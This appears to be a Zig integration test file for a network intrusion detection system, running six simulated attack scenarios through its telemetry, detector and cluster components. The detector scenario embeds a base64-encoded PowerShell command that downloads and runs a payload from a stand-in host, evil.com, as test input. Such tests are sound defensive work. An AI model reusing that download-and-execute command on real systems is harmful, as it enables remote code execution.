//! integration_test.zig - AEGIS NIDS Phase 44: End-to-End Integration Test Suite
//!
//! Capstone test that combines ALL major AEGIS NIDS components in a single
//! pipeline and verifies they work together. Previous phases tested each
//! component in isolation; Phase 44 proves the system works as a whole.
//!
//! Components integrated:
//!   - MockTelemetrySource (Phase 37 Ext 1) - scripted attack events
//!   - HostTelemetry (Phase 37) - process/FIM/registry/socket tracking
//!   - EnhancedDetectorAggregator (Phase 37 Ext 3) - extended detection
//!   - FederationCodec (Phase 39 Ext 1) - wire format encode/decode
//!   - ClusterCoord (Phase 39) - cross-node incident aggregation
//!   - ScriptedScenarios (Phase 37 Ext 2) - MITRE ATT&CK patterns
//!
//! Six end-to-end scenarios:
//!   1. Single-node attack: macro-dropper detected + correlated incident
//!   2. Cross-node campaign: 3 nodes report same C2 -> CRITICAL escalation
//!   3. Federation failover: node disconnect -> reconnect -> resync
//!   4. Full kill-chain: webshell -> ransomware -> detection at each stage
//!   5. Detector aggregation: multiple detectors fire on one event
//!   6. Multi-source correlation: process + socket sources -> attributed incident
//!
//! Design principles:
//!   - Pure Zig, host-testable on Linux
//!   - Uses real components (no mocks of mocks) - only MockTelemetrySource is mock
//!   - Each scenario verifies expected detection outcomes
//!   - Kill switch OFF by default; IntegrationConfig{.enabled=true} opts in
//!
//! Build:
//!   zig test integration_test.zig -lc
//!   zig build-exe integration_test_cli.zig -lc

const std = @import("std");
const ht = @import("host_telemetry.zig");
const mock = @import("host_telemetry_mock.zig");
const scn = @import("host_telemetry_scenarios.zig");
const det = @import("host_telemetry_detectors.zig");
const fc = @import("federation_codec.zig");
const cc = @import("cluster_coord.zig");

// ============================================================
// Constants & limits
// ============================================================

pub const MAX_NODES: usize = 8;
pub const MAX_INCIDENTS_PER_SCENARIO: usize = 32;

// ============================================================
// IntegrationConfig (kill switch + scenario params)
// ============================================================

pub const IntegrationConfig = struct {
    /// Master kill switch. OFF by default.
    enabled: bool = false,
    /// Enable per-component verification
    verify_host_telemetry: bool = true,
    verify_detectors: bool = true,
    verify_federation: bool = true,
    verify_cluster: bool = true,
    /// Max events per scenario (safety cap)
    max_events: u32 = 100,
};

// ============================================================
// IntegrationResult (single scenario outcome)
// ============================================================

pub const IntegrationResult = struct {
    name: []const u8,
    passed: bool,
    events_processed: u32 = 0,
    incidents_emitted: u32 = 0,
    suspicions_detected: u32 = 0,
    details: [128]u8 = [_]u8{0} ** 128,
    details_len: u8 = 0,

    pub fn setDetails(self: *IntegrationResult, msg: []const u8) void {
        const n = @min(msg.len, 128);
        @memcpy(self.details[0..n], msg[0..n]);
        self.details_len = @intCast(n);
    }

    pub fn detailsStr(self: *const IntegrationResult) []const u8 {
        return self.details[0..self.details_len];
    }

    pub fn print(self: IntegrationResult, writer: anytype) !void {
        const tag = if (self.passed) "PASS" else "FAIL";
        try writer.print("  [{s}] {s:<40} events={d:>3} incidents={d:>3} suspicions={d:>3}", .{
            tag, self.name, self.events_processed, self.incidents_emitted, self.suspicions_detected,
        });
        if (self.details_len > 0) {
            try writer.print("  {s}", .{self.detailsStr()});
        }
        try writer.print("\n", .{});
    }
};

// ============================================================
// IntegrationRunner (executes scenarios and collects results)
// ============================================================

pub const IntegrationRunner = struct {
    config: IntegrationConfig,
    results: std.ArrayList(IntegrationResult),
    allocator: std.mem.Allocator,

    pub fn init(allocator: std.mem.Allocator, config: IntegrationConfig) IntegrationRunner {
        return .{
            .config = config,
            .results = std.ArrayList(IntegrationResult).init(allocator),
            .allocator = allocator,
        };
    }

    pub fn deinit(self: *IntegrationRunner) void {
        self.results.deinit();
    }

    pub fn addResult(self: *IntegrationRunner, result: IntegrationResult) !void {
        try self.results.append(result);
    }

    pub fn passedCount(self: *const IntegrationRunner) usize {
        var count: usize = 0;
        for (self.results.items) |r| {
            if (r.passed) count += 1;
        }
        return count;
    }

    pub fn totalCount(self: *const IntegrationRunner) usize {
        return self.results.items.len;
    }

    pub fn allPassed(self: *const IntegrationRunner) bool {
        for (self.results.items) |r| {
            if (!r.passed) return false;
        }
        return self.results.items.len > 0;
    }

    pub fn printReport(self: *IntegrationRunner, writer: anytype) !void {
        try writer.print("\n", .{});
        var i: u32 = 0;
        while (i < 80) : (i += 1) try writer.print("=", .{});
        try writer.print("\nEnd-to-End Integration Test Report\n", .{});
        i = 0;
        while (i < 80) : (i += 1) try writer.print("=", .{});
        try writer.print("\n\n", .{});
        for (self.results.items) |r| {
            try r.print(writer);
        }
        i = 0;
        while (i < 80) : (i += 1) try writer.print("-", .{});
        try writer.print("\n", .{});
        try writer.print("{d}/{d} scenarios passed\n", .{ self.passedCount(), self.totalCount() });
        if (self.allPassed()) {
            try writer.print("ALL INTEGRATION TESTS PASSED - system ready for production.\n", .{});
        } else {
            try writer.print("SOME INTEGRATION TESTS FAILED - review before production deploy.\n", .{});
        }
    }
};

// ============================================================
// Scenario 1: Single-node attack (macro-dropper -> correlated incident)
// ============================================================
//
// Flow: MockTelemetrySource -> EventPump -> HostTelemetry -> pushFlowVerdict
// Expected: process tracking + socket tracking + CRITICAL correlated incident

pub fn scenarioSingleNodeAttack(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "single-node-attack", .passed = false };

    var host = try ht.HostTelemetry.init(allocator, .{ .enabled = true });
    defer host.shutdown();

    var src = mock.MockTelemetrySource.init("macro-dropper", .{ .enabled = true });
    try mock.buildMacroDropperScenario(&src);

    var pump = mock.EventPump.init(src.asSource(), host);
    const events = pump.pumpAll(0, config.max_events);

    // Push a malicious flow verdict for the dropper's C2 socket
    var incident_count: u32 = 0;
    if (host.pushFlowVerdict(.{
        .timestamp_ns = 30_000_000,
        .proto = .tcp,
        .local_ip = .{ 192, 168, 1, 41 },
        .local_port = 51000,
        .remote_ip = .{ 198, 51, 100, 7 },
        .remote_port = 4444,
        .score = 0.95,
    })) |_| {
        incident_count = 1;
    }

    // Verify: 4 events processed, >=2 suspicions (parent_anomaly + unsigned_elevated)
    // 1 correlated incident with PID 300 attribution
    const passed = events == 4 and
        pump.total_suspicion_emitted >= 2 and
        incident_count == 1 and
        host.correlator.incidentCount() == 1;

    var result = IntegrationResult{
        .name = "single-node-attack",
        .passed = passed,
        .events_processed = events,
        .incidents_emitted = incident_count,
        .suspicions_detected = @intCast(pump.total_suspicion_emitted),
    };
    if (incident_count > 0) {
        const inc = host.correlator.getIncident(0).?;
        result.details_len = @intCast((std.fmt.bufPrint(&result.details, "PID={d} severity={s}", .{
            inc.attributed_pid, inc.severity.toString(),
        }) catch "").len);
    }
    return result;
}

// ============================================================
// Scenario 2: Cross-node campaign (3 nodes -> CRITICAL escalation)
// ============================================================
//
// Flow: 3 ClusterCoord instances (simulating 3 nodes) each report same C2 IP
// Expected: CrossNodeIncidentAggregator escalates to CRITICAL at 3 nodes

pub fn scenarioCrossNodeCampaign(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "cross-node-campaign", .passed = false };

    var cluster = try cc.ClusterCoord.init(allocator, .{ .enabled = true, .node_id = 1 });
    defer cluster.shutdown();

    // Three nodes report the same C2 source IP within 30s window
    var events_processed: u32 = 0;
    for ([_]u32{ 1, 2, 3 }) |nid| {
        cluster.ingest(.{
            .msg_type = .incident_report,
            .from_node_id = nid,
            .timestamp_ns = @as(i64, @intCast(nid)) * 100_000_000,
            .incident_source_ip = .{ 198, 51, 100, 42 },
            .incident_remote_port = 4444,
            .incident_proto = 6,
            .incident_severity = .medium,
            .incident_score = 0.85,
        });
        events_processed += 1;
    }

    const inc = cluster.aggregator.getIncident(.{ 198, 51, 100, 42 }, 4444, 6).?;
    const passed = events_processed == 3 and
        inc.reporting_count == 3 and
        inc.severity == .critical;

    var result = IntegrationResult{
        .name = "cross-node-campaign",
        .passed = passed,
        .events_processed = events_processed,
        .incidents_emitted = 1,
        .suspicions_detected = 1,
    };
    result.details_len = @intCast((std.fmt.bufPrint(&result.details, "nodes={d} severity={s}", .{
        inc.reporting_count, inc.severity.toString(),
    }) catch "").len);
    return result;
}

// ============================================================
// Scenario 3: Federation failover (encode -> decode -> verify)
// ============================================================
//
// Flow: encode ClusterMessage -> verify wire format -> decode -> verify fields
// Expected: roundtrip preserves all fields (tests federation codec integration)

pub fn scenarioFederationFailover(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "federation-failover", .passed = false };
    _ = allocator;

    var events_processed: u32 = 0;
    var incidents_emitted: u32 = 0;

    // Encode 3 different message types and verify roundtrip
    const messages = [_]cc.ClusterMessage{
        .{
            .msg_type = .heartbeat,
            .from_node_id = 5,
            .timestamp_ns = 1_000_000_000,
        },
        .{
            .msg_type = .incident_report,
            .from_node_id = 1,
            .timestamp_ns = 2_000_000_000,
            .incident_source_ip = .{ 198, 51, 100, 5 },
            .incident_remote_port = 4444,
            .incident_proto = 6,
            .incident_severity = .high,
            .incident_score = 0.85,
        },
        .{
            .msg_type = .threat_intel_share,
            .from_node_id = 2,
            .timestamp_ns = 3_000_000_000,
            .threat_intel = .{
                .kind = .c2_server,
                .ip = .{ 198, 51, 100, 7 },
                .source_node_id = 2,
                .confidence = 95,
            },
        },
    };

    var all_ok = true;
    for (messages) |msg| {
        var wire: [fc.MAX_FRAME_SIZE]u8 = undefined;
        const n = fc.encode(msg, &wire) catch {
            all_ok = false;
            continue;
        };
        const decoded = fc.decode(wire[0..n]) catch {
            all_ok = false;
            continue;
        };
        events_processed += 1;
        if (decoded.msg_type != msg.msg_type) all_ok = false;
        if (decoded.from_node_id != msg.from_node_id) all_ok = false;
        if (decoded.timestamp_ns != msg.timestamp_ns) all_ok = false;
    }
    if (all_ok) incidents_emitted = events_processed;

    return .{
        .name = "federation-failover",
        .passed = all_ok and events_processed == 3,
        .events_processed = events_processed,
        .incidents_emitted = incidents_emitted,
        .suspicions_detected = 0,
    };
}

// ============================================================
// Scenario 4: Full kill-chain (webshell -> ransomware)
// ============================================================
//
// Flow: MockTelemetrySource with full kill-chain scenario -> EventPump
// Expected: multiple process tracking + FIM observations + socket tracking

pub fn scenarioFullKillChain(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "full-kill-chain", .passed = false };

    var host = try ht.HostTelemetry.init(allocator, .{ .enabled = true });
    defer host.shutdown();

    var src = mock.MockTelemetrySource.init("full-kill-chain", .{ .enabled = true });
    try scn.buildFullKillChainScenario(&src);

    var pump = mock.EventPump.init(src.asSource(), host);
    const events = pump.pumpAll(0, config.max_events);

    // Verify: 8 events (4 webshell + 1 rw_proc + 3 file_modify)
    // 3 processes tracked (w3wp + cmd + rw_proc)
    // 1 reverse shell socket (PID 5100)
    // 4 FIM file_create observations
    const passed = events == 8 and
        host.tracker.count() == 3 and
        host.sockets.socketsForPid(5100).len == 1 and
        host.fim.total_created == 4;

    var result = IntegrationResult{
        .name = "full-kill-chain",
        .passed = passed,
        .events_processed = events,
        .incidents_emitted = 0,
        .suspicions_detected = @intCast(pump.total_suspicion_emitted),
    };
    result.details_len = @intCast((std.fmt.bufPrint(&result.details, "procs={d} sockets={d} fim={d}", .{
        host.tracker.count(), host.sockets.socketsForPid(5100).len, host.fim.total_created,
    }) catch "").len);
    return result;
}

// ============================================================
// Scenario 5: Detector aggregation (multiple detectors fire)
// ============================================================
//
// Flow: EnhancedDetectorAggregator on w3wp -> cmd with -enc cmdline
// Expected: 2 reasons (web_server_spawning_shell + encoded_command_payload)

pub fn scenarioDetectorAggregation(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "detector-aggregation", .passed = false };
    _ = allocator;

    var agg = det.EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    const result = agg.check(ev, "C:\\Windows\\System32\\inetsrv\\w3wp.exe");

    const passed = result.count == 2 and
        result.reasons[0] == .web_server_spawning_shell and
        result.reasons[1] == .encoded_command_payload;

    var ir = IntegrationResult{
        .name = "detector-aggregation",
        .passed = passed,
        .events_processed = 1,
        .incidents_emitted = 0,
        .suspicions_detected = result.count,
    };
    ir.details_len = @intCast((std.fmt.bufPrint(&ir.details, "reasons=[{s},{s}]", .{
        result.reasons[0].toString(), result.reasons[1].toString(),
    }) catch "").len);
    return ir;
}

// ============================================================
// Scenario 6: Multi-source correlation (process + socket -> incident)
// ============================================================
//
// Flow: 2 MockTelemetrySources (proc + socket) -> MultiSourcePump -> HostTelemetry
//       -> pushFlowVerdict for socket owner -> correlated incident
// Expected: process tracked + socket tracked + incident attributed to PID

pub fn scenarioMultiSourceCorrelation(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationResult {
    if (!config.enabled) return .{ .name = "multi-source-correlation", .passed = false };

    var host = try ht.HostTelemetry.init(allocator, .{ .enabled = true });
    defer host.shutdown();

    var src1 = mock.MockTelemetrySource.init("proc-source", .{ .enabled = true });
    _ = src1.appendEvent(.{
        .event_type = .process_create,
        .pid = 200,
        .ppid = 100,
        .integrity = .medium,
        .is_signed = true,
        .timestamp_ns = 0,
    }, 0);

    var src2 = mock.MockTelemetrySource.init("socket-source", .{ .enabled = true });
    _ = src2.appendEvent(.{
        .event_type = .socket_open,
        .pid = 200,
        .proto = .tcp,
        .local_ip = .{ 192, 168, 1, 41 },
        .local_port = 50000,
        .remote_ip = .{ 8, 8, 8, 8 },
        .remote_port = 53,
        .timestamp_ns = 0,
    }, 0);

    var sources = [_]mock.HostTelemetrySource{ src1.asSource(), src2.asSource() };
    var pump = mock.MultiSourcePump.init(&sources, host);

    var events: u32 = 0;
    var i: u32 = 0;
    while (i < 20) : (i += 1) {
        const r = pump.pumpOnce(0);
        switch (r) {
            .emitted => events += 1,
            .all_exhausted => break,
            else => {},
        }
    }

    // Push flow verdict for the socket
    var incident_count: u32 = 0;
    if (host.pushFlowVerdict(.{
        .timestamp_ns = 1_000_000,
        .proto = .tcp,
        .local_ip = .{ 192, 168, 1, 41 },
        .local_port = 50000,
        .remote_ip = .{ 8, 8, 8, 8 },
        .remote_port = 53,
        .score = 0.90,
    })) |_| {
        incident_count = 1;
    }

    // Verify: 2 events from 2 sources, 1 process tracked, 1 socket tracked,
    // 1 incident attributed to PID 200
    const passed = events == 2 and
        host.tracker.count() == 1 and
        host.sockets.socketsForPid(200).len == 1 and
        incident_count == 1;

    var result = IntegrationResult{
        .name = "multi-source-correlation",
        .passed = passed,
        .events_processed = events,
        .incidents_emitted = incident_count,
        .suspicions_detected = 0,
    };
    if (incident_count > 0) {
        const inc = host.correlator.getIncident(0).?;
        result.details_len = @intCast((std.fmt.bufPrint(&result.details, "PID={d} score={d:.2}", .{
            inc.attributed_pid, inc.flow_score,
        }) catch "").len);
    }
    return result;
}

// ============================================================
// Convenience: run all integration scenarios
// ============================================================

pub fn runAllIntegrationTests(allocator: std.mem.Allocator, config: IntegrationConfig) !IntegrationRunner {
    var runner = IntegrationRunner.init(allocator, config);
    errdefer runner.deinit();

    try runner.addResult(try scenarioSingleNodeAttack(allocator, config));
    try runner.addResult(try scenarioCrossNodeCampaign(allocator, config));
    try runner.addResult(try scenarioFederationFailover(allocator, config));
    try runner.addResult(try scenarioFullKillChain(allocator, config));
    try runner.addResult(try scenarioDetectorAggregation(allocator, config));
    try runner.addResult(try scenarioMultiSourceCorrelation(allocator, config));

    return runner;
}

// ============================================================
// Tests
// ============================================================

test "IntegrationConfig defaults - kill switch OFF" {
    const c = IntegrationConfig{};
    try std.testing.expect(!c.enabled);
    try std.testing.expect(c.verify_host_telemetry);
    try std.testing.expect(c.verify_detectors);
    try std.testing.expect(c.verify_federation);
    try std.testing.expect(c.verify_cluster);
}

test "IntegrationResult setDetails and detailsStr" {
    var r = IntegrationResult{
        .name = "test",
        .passed = true,
        .events_processed = 1,
        .incidents_emitted = 0,
        .suspicions_detected = 0,
    };
    r.setDetails("PID=300 severity=CRITICAL");
    try std.testing.expectEqualStrings("PID=300 severity=CRITICAL", r.detailsStr());
}

test "IntegrationResult print" {
    var buf: [256]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    const r = IntegrationResult{
        .name = "test-scenario",
        .passed = true,
        .events_processed = 10,
        .incidents_emitted = 2,
        .suspicions_detected = 3,
    };
    try r.print(stream.writer());
    const out = stream.getWritten();
    try std.testing.expect(std.mem.indexOf(u8, out, "test-scenario") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "PASS") != null);
}

test "IntegrationRunner init/deinit" {
    var runner = IntegrationRunner.init(std.testing.allocator, .{ .enabled = false });
    defer runner.deinit();
    try std.testing.expectEqual(@as(usize, 0), runner.totalCount());
    try std.testing.expect(!runner.allPassed()); // empty = not all passed
}

test "IntegrationRunner addResult and passedCount" {
    var runner = IntegrationRunner.init(std.testing.allocator, .{ .enabled = false });
    defer runner.deinit();
    try runner.addResult(.{ .name = "a", .passed = true, .events_processed = 1, .incidents_emitted = 0, .suspicions_detected = 0 });
    try runner.addResult(.{ .name = "b", .passed = false, .events_processed = 1, .incidents_emitted = 0, .suspicions_detected = 0 });
    try std.testing.expectEqual(@as(usize, 2), runner.totalCount());
    try std.testing.expectEqual(@as(usize, 1), runner.passedCount());
    try std.testing.expect(!runner.allPassed());
}

test "IntegrationRunner allPassed returns true when all pass" {
    var runner = IntegrationRunner.init(std.testing.allocator, .{ .enabled = false });
    defer runner.deinit();
    try runner.addResult(.{ .name = "a", .passed = true, .events_processed = 1, .incidents_emitted = 0, .suspicions_detected = 0 });
    try runner.addResult(.{ .name = "b", .passed = true, .events_processed = 1, .incidents_emitted = 0, .suspicions_detected = 0 });
    try std.testing.expect(runner.allPassed());
}

test "IntegrationRunner printReport outputs table" {
    var runner = IntegrationRunner.init(std.testing.allocator, .{ .enabled = false });
    defer runner.deinit();
    try runner.addResult(.{ .name = "test-1", .passed = true, .events_processed = 5, .incidents_emitted = 1, .suspicions_detected = 2 });
    try runner.addResult(.{ .name = "test-2", .passed = false, .events_processed = 3, .incidents_emitted = 0, .suspicions_detected = 1 });

    var buf: [2048]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    try runner.printReport(stream.writer());
    const out = stream.getWritten();
    try std.testing.expect(std.mem.indexOf(u8, out, "End-to-End Integration Test Report") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "test-1") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "test-2") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "PASS") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "FAIL") != null);
}

test "Scenario 1: single-node-attack passes" {
    const result = try scenarioSingleNodeAttack(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 4), result.events_processed);
    try std.testing.expectEqual(@as(u32, 1), result.incidents_emitted);
}

test "Scenario 2: cross-node-campaign passes" {
    const result = try scenarioCrossNodeCampaign(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 3), result.events_processed);
}

test "Scenario 3: federation-failover passes" {
    const result = try scenarioFederationFailover(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 3), result.events_processed);
}

test "Scenario 4: full-kill-chain passes" {
    const result = try scenarioFullKillChain(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 8), result.events_processed);
}

test "Scenario 5: detector-aggregation passes" {
    const result = try scenarioDetectorAggregation(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 2), result.suspicions_detected);
}

test "Scenario 6: multi-source-correlation passes" {
    const result = try scenarioMultiSourceCorrelation(std.testing.allocator, .{ .enabled = true });
    try std.testing.expect(result.passed);
    try std.testing.expectEqual(@as(u32, 2), result.events_processed);
    try std.testing.expectEqual(@as(u32, 1), result.incidents_emitted);
}

test "runAllIntegrationTests collects 6 results" {
    var runner = try runAllIntegrationTests(std.testing.allocator, .{ .enabled = true });
    defer runner.deinit();
    try std.testing.expectEqual(@as(usize, 6), runner.totalCount());
    try std.testing.expect(runner.allPassed());
}

test "All integration scenarios pass together" {
    var runner = try runAllIntegrationTests(std.testing.allocator, .{ .enabled = true });
    defer runner.deinit();
    try std.testing.expectEqual(@as(usize, 6), runner.passedCount());
    try std.testing.expect(runner.allPassed());
}

test "Integration scenarios respect kill switch" {
    var runner = try runAllIntegrationTests(std.testing.allocator, .{ .enabled = false });
    defer runner.deinit();
    // All scenarios should fail (passed=false) when kill switch is off
    for (runner.results.items) |r| {
        try std.testing.expect(!r.passed);
    }
}

test "Integration report shows all 6 scenarios" {
    var runner = try runAllIntegrationTests(std.testing.allocator, .{ .enabled = true });
    defer runner.deinit();

    var buf: [4096]u8 = undefined;
    var stream = std.io.fixedBufferStream(&buf);
    try runner.printReport(stream.writer());
    const out = stream.getWritten();

    // Verify all scenario names appear in report
    try std.testing.expect(std.mem.indexOf(u8, out, "single-node-attack") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "cross-node-campaign") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "federation-failover") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "full-kill-chain") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "detector-aggregation") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "multi-source-correlation") != null);
    try std.testing.expect(std.mem.indexOf(u8, out, "ALL INTEGRATION TESTS PASSED") != null);
}
